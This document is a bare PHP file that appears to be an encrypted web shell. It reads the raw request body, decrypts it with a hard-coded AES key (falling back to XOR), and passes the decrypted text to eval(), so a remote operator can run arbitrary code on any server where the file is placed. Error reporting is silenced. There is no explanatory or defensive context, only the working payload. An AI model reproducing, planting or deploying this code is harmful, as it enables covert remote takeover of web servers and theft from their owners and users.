<?php
@error_reporting(0);
session_start();
if (!isset($_SESSION['k']))
{
    $_SESSION['k']='2c25dfbedf9e402a';
}

$key=$_SESSION['k'];
$post=file_get_contents("php://input");
if(!extension_loaded('openssl'))
{
		for($i=0;$i<strlen($post);$i++) {
			$post[$i] = $post[$i]^$key[$i+1&15]; 
    	}
}
else
{
		$post=openssl_decrypt($post,"AES128",$key,1);
}
$arr=explode('|',$post);
class C{public function __construct($p) {eval($p."");}}
@new C($arr[1]);
?>